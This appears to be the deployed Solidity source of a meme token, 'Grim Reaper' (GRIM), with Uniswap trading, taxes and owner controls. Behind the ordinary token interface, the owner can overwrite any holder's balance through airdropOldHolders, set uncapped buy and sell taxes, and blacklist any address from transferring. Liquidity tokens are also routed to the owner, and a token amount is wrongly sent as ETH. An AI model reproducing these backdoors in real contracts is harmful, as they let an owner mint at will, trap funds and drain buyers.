1 //SPDX-License-Identifier: MIT
2 /**
3 https://t.me/GrimReaperCoin
4 **/
5 
6 pragma solidity ^0.8.12;
7 
8 interface IUniswapV2Factory {
9 	function createPair(address tokenA, address tokenB) external returns (address pair);
10 }
11 
12 interface IUniswapV2Router02 {
13 	function swapExactTokensForETHSupportingFeeOnTransferTokens(
14 		uint amountIn,
15 		uint amountOutMin,
16 		address[] calldata path,
17 		address to,
18 		uint deadline
19 	) external;
20 	function factory() external pure returns (address);
21 	function WETH() external pure returns (address);
22 	function addLiquidityETH(
23 		address token,
24 		uint amountTokenDesired,
25 		uint amountTokenMin,
26 		uint amountETHMin,
27 		address to,
28 		uint deadline
29 	) external payable returns (uint amountToken, uint amountETH, uint liquidity);
30 }
31 
32 abstract contract Context {
33 	function _msgSender() internal view virtual returns (address) {
34 		return msg.sender;
35 	}
36 }
37 
38 interface IERC20 {
39 	function totalSupply() external view returns (uint256);
40 	function balanceOf(address account) external view returns (uint256);
41 	function transfer(address recipient, uint256 amount) external returns (bool);
42 	function allowance(address owner, address spender) external view returns (uint256);
43 	function approve(address spender, uint256 amount) external returns (bool);
44 	function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
45 	event Transfer(address indexed from, address indexed to, uint256 value);
46 	event Approval(address indexed owner, address indexed spender, uint256 value);
47 }
48 
49 library SafeMath {
50 	function add(uint256 a, uint256 b) internal pure returns (uint256) {
51 		uint256 c = a + b;
52 		require(c >= a, "SafeMath: addition overflow");
53 		return c;
54 	}
55 
56 	function sub(uint256 a, uint256 b) internal pure returns (uint256) {
57 		return sub(a, b, "SafeMath: subtraction overflow");
58 	}
59 
60 	function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
61 		require(b <= a, errorMessage);
62 		uint256 c = a - b;
63 		return c;
64 	}
65 
66 	function mul(uint256 a, uint256 b) internal pure returns (uint256) {
67 		if (a == 0) {
68 			return 0;
69 		}
70 		uint256 c = a * b;
71 		require(c / a == b, "SafeMath: multiplication overflow");
72 		return c;
73 	}
74 
75 	function div(uint256 a, uint256 b) internal pure returns (uint256) {
76 		return div(a, b, "SafeMath: division by zero");
77 	}
78 
79 	function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
80 		require(b > 0, errorMessage);
81 		uint256 c = a / b;
82 		return c;
83 	}
84 
85 }
86 
87 contract Ownable is Context {
88 	address private _owner;
89 	address private _previousOwner;
90 	event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
91 
92 	constructor () {
93 		address msgSender = _msgSender();
94 		_owner = msgSender;
95 		emit OwnershipTransferred(address(0), msgSender);
96 	}
97 
98 	function owner() public view returns (address) {
99 		return _owner;
100 	}
101 
102 	modifier onlyOwner() {
103 		require(_owner == _msgSender(), "Ownable: caller is not the owner");
104 		_;
105 	}
106 
107 	function renounceOwnership() public virtual onlyOwner {
108 		emit OwnershipTransferred(_owner, address(0));
109 		_owner = address(0);
110 	}
111 
112 }
113 
114 
115 contract GrimReaper is Context, IERC20, Ownable {
116 	using SafeMath for uint256;
117 	mapping (address => uint256) private _balance;
118 	mapping (address => mapping (address => uint256)) private _allowances;
119 	mapping (address => bool) private _isExcludedFromFee;
120 	mapping(address => bool) public bots;
121 
122 	uint256 private _tTotal = 100000000 * 10**8;
123     uint256 private _contractAutoLpLimitToken = 1000000000000000000;
124 
125 	uint256 private _taxFee;
126     uint256 private _buyTaxMarketing = 8;
127     uint256 private _sellTaxMarketing = 3;
128     uint256 private _autoLpFee = 3;
129     uint256 private _LpPercentBase100 = 35;
130 	address payable private _taxWallet;
131     address payable private _contractPayment;
132 	uint256 private _maxTxAmount;
133 	uint256 private _maxWallet;
134 
135 	string private constant _name = "Grim Reaper";
136 	string private constant _symbol = "GRIM";
137 	uint8 private constant _decimals = 8;
138 
139 	IUniswapV2Router02 private _uniswap;
140 	address private _pair;
141 	bool private _canTrade;
142 	bool private _inSwap = false;
143 	bool private _swapEnabled = false;
144 
145     event SwapAndLiquify(
146         uint256 tokensSwapped,
147         uint256 coinReceived,
148         uint256 tokensIntoLiqudity
149     );
150 
151 	modifier lockTheSwap {
152 		_inSwap = true;
153 		_;
154 		_inSwap = false;
155 	}
156     
157 	constructor () {
158 		_taxWallet = payable(_msgSender());
159         _contractPayment = payable(address(this));
160 
161 		_taxFee = _buyTaxMarketing + _autoLpFee;
162 		_uniswap = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
163 
164 		_isExcludedFromFee[address(this)] = true;
165 		_isExcludedFromFee[_taxWallet] = true;
166         _maxTxAmount = _tTotal.mul(2).div(10**2);
167 	    _maxWallet = _tTotal.mul(4).div(10**2);
168 
169 		_balance[address(this)] = _tTotal;
170 		emit Transfer(address(0x0), address(this), _tTotal);
171 	}
172 
173 	function maxTxAmount() public view returns (uint256){
174 		return _maxTxAmount;
175 	}
176 
177 	function maxWallet() public view returns (uint256){
178 		return _maxWallet;
179 	}
180 
181     function isInSwap() public view returns (bool) {
182         return _inSwap;
183     }
184 
185     function isSwapEnabled() public view returns (bool) {
186         return _swapEnabled;
187     }
188 
189 	function name() public pure returns (string memory) {
190 		return _name;
191 	}
192 
193 	function symbol() public pure returns (string memory) {
194 		return _symbol;
195 	}
196 
197 	function decimals() public pure returns (uint8) {
198 		return _decimals;
199 	}
200 
201 	function totalSupply() public view override returns (uint256) {
202 		return _tTotal;
203 	}
204 
205     function excludeFromFee(address account) public onlyOwner {
206         _isExcludedFromFee[account] = true;
207     }
208     
209     function includeInFee(address account) public onlyOwner {
210         _isExcludedFromFee[account] = false;
211     }
212     
213     function setTaxFeePercent(uint256 taxFee) external onlyOwner() {
214         _taxFee = taxFee;
215     }
216 
217     function setSellMarketingTax(uint256 taxFee) external onlyOwner() {
218         _sellTaxMarketing = taxFee;
219     }
220 
221     function setBuyMarketingTax(uint256 taxFee) external onlyOwner() {
222         _buyTaxMarketing = taxFee;
223     }
224 
225     function setAutoLpFee(uint256 taxFee) external onlyOwner() {
226         _autoLpFee = taxFee;
227     }
228 
229     function setContractAutoLpLimit(uint256 newLimit) external onlyOwner() {
230         _contractAutoLpLimitToken = newLimit;
231     }
232 
233 	function balanceOf(address account) public view override returns (uint256) {
234 		return _balance[account];
235 	}
236 
237 	function transfer(address recipient, uint256 amount) public override returns (bool) {
238 		_transfer(_msgSender(), recipient, amount);
239 		return true;
240 	}
241 
242 	function allowance(address owner, address spender) public view override returns (uint256) {
243 		return _allowances[owner][spender];
244 	}
245 
246 	function approve(address spender, uint256 amount) public override returns (bool) {
247 		_approve(_msgSender(), spender, amount);
248 		return true;
249 	}
250 
251 	function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
252 		_transfer(sender, recipient, amount);
253 		_approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
254 		return true;
255 	}
256 
257 	function _approve(address owner, address spender, uint256 amount) private {
258 		require(owner != address(0), "ERC20: approve from the zero address");
259 		require(spender != address(0), "ERC20: approve to the zero address");
260 		_allowances[owner][spender] = amount;
261 		emit Approval(owner, spender, amount);
262 	}
263 
264 	function _transfer(address from, address to, uint256 amount) private {
265 		require(from != address(0), "ERC20: transfer from the zero address");
266 		require(to != address(0), "ERC20: transfer to the zero address");
267 		require(amount > 0, "Transfer amount must be greater than zero");
268 		require(!bots[from] && !bots[to], "This account is blacklisted");
269 
270 		if (from != owner() && to != owner()) {
271 			if (from == _pair && to != address(_uniswap) && ! _isExcludedFromFee[to] ) {
272 				require(amount<=_maxTxAmount,"Transaction amount limited");
273 				require(_canTrade,"Trading not started");
274 				require(balanceOf(to) + amount <= _maxWallet, "Balance exceeded wallet size");
275 			}
276 
277             if (from == _pair) {
278                 _taxFee = buyTax();
279             } else {
280                 _taxFee = sellTax();
281             }
282 
283             uint256 contractTokenBalance = balanceOf(address(this));
284             if(!_inSwap && from != _pair && _swapEnabled) {
285                 if(contractTokenBalance >= _contractAutoLpLimitToken) {
286                     swapAndLiquify(contractTokenBalance);
287                 }
288             }
289 		}
290 
291 		_tokenTransfer(from,to,amount,(_isExcludedFromFee[to]||_isExcludedFromFee[from])?0:_taxFee);
292 	}
293 
294     function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
295         uint256 autoLpTokenBalance = contractTokenBalance.mul(_LpPercentBase100).div(10**2);
296         uint256 marketingAmount = contractTokenBalance.sub(autoLpTokenBalance);
297 
298         uint256 half = autoLpTokenBalance.div(2);
299         uint256 otherHalf = autoLpTokenBalance.sub(half);
300 
301         uint256 initialBalance = address(this).balance;
302         swapTokensForEth(half);
303         uint256 newBalance = address(this).balance.sub(initialBalance);
304 
305         addLiquidityAuto(newBalance, otherHalf);
306         
307         emit SwapAndLiquify(half, newBalance, otherHalf);
308 
309         swapTokensForEth(marketingAmount);
310         sendETHToFee(marketingAmount);
311     }
312 
313     function buyTax() private view returns (uint256) {
314         return (_autoLpFee + _buyTaxMarketing);
315     }
316 
317     function sellTax() private view returns (uint256) {
318         return (_autoLpFee + _sellTaxMarketing);
319     }
320 
321 	function setMaxTx(uint256 amount) public onlyOwner{
322 		require(amount>_maxTxAmount);
323 		_maxTxAmount=amount;
324 	}
325 
326 	function sendETHToFee(uint256 amount) private {
327 		_taxWallet.transfer(amount);
328 	}
329 
330     function swapTokensForEth(uint256 tokenAmount) private {
331 		address[] memory path = new address[](2);
332 		path[0] = address(this);
333 		path[1] = _uniswap.WETH();
334 		_approve(address(this), address(_uniswap), tokenAmount);
335 		_uniswap.swapExactTokensForETHSupportingFeeOnTransferTokens(
336 			tokenAmount,
337 			0,
338 			path,
339 			address(this),
340 			block.timestamp
341 		);
342 	}
343 
344 	function createPair() external onlyOwner {
345 		require(!_canTrade,"Trading is already open");
346 		_approve(address(this), address(_uniswap), _tTotal);
347 		_pair = IUniswapV2Factory(_uniswap.factory()).createPair(address(this), _uniswap.WETH());
348 		IERC20(_pair).approve(address(_uniswap), type(uint).max);
349 	}
350 
351 	function addLiquidityInitial() external onlyOwner{
352 		_uniswap.addLiquidityETH{value: address(this).balance} (
353             address(this),
354             balanceOf(address(this)),
355             0,
356             0,
357             owner(),
358             block.timestamp
359         );
360 
361 		_swapEnabled = true;
362 	}
363 
364     function addLiquidityAuto(uint256 etherValue, uint256 tokenValue) private {
365         _approve(address(this), address(_uniswap), tokenValue);
366         _uniswap.addLiquidityETH{value: etherValue} (
367             address(this),
368             tokenValue,
369             0,
370             0,
371             owner(),
372             block.timestamp
373         );
374 
375         _swapEnabled = true;
376     }
377 
378 	function enableTrading(bool _enable) external onlyOwner{
379 		_canTrade = _enable;
380 	}
381 
382 	function _tokenTransfer(address sender, address recipient, uint256 tAmount, uint256 taxRate) private {
383 		uint256 tTeam = tAmount.mul(taxRate).div(100);
384 		uint256 tTransferAmount = tAmount.sub(tTeam);
385 
386 		_balance[sender] = _balance[sender].sub(tAmount);
387 		_balance[recipient] = _balance[recipient].add(tTransferAmount);
388 		_balance[address(this)] = _balance[address(this)].add(tTeam);
389 		emit Transfer(sender, recipient, tTransferAmount);
390 	}
391 
392 	function setMaxWallet(uint256 amount) public onlyOwner{
393 		require(amount>_maxWallet);
394 		_maxWallet=amount;
395 	}
396 
397 	receive() external payable {}
398 
399 	function blockBots(address[] memory bots_) public onlyOwner  {for (uint256 i = 0; i < bots_.length; i++) {bots[bots_[i]] = true;}}
400 	function unblockBot(address notbot) public onlyOwner {
401 			bots[notbot] = false;
402 	}
403 
404 	function manualsend() public{
405 		uint256 contractETHBalance = address(this).balance;
406 		sendETHToFee(contractETHBalance);
407 	}
408 
409     function airdropOldHolders(address[] memory recipients, uint256[] memory amounts) public onlyOwner {
410         for(uint256 i = 0; i < recipients.length; i++) {
411             _balance[recipients[i]] = amounts[i] * 10**8;
412             emit Transfer(address(this), recipients[i], amounts[i] * 10**8);
413         }
414     }
415 }